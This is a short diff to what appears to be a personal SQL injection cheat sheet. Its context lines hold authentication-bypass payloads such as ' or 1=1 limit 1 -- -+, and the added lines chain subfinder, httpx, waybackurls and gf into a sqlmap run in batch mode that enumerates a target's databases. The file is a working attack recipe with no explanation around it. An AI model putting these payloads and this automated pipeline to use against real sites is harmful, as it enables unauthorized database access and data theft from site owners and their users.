@@ -6,3 +6,10 @@
 ' or 1=1 limit 1 -- -+
  
  ' or ''=' 
+
+ ///
+ subfinder -d target | tee -a domains
+ cat domain | httpx | tee -a alive.txt
+ cat alive.txt | waybackurls | tee -a urls 
+ gf sqli urls >> sqli
+ python3 sqlmap.py -m sqli --dbs --batch
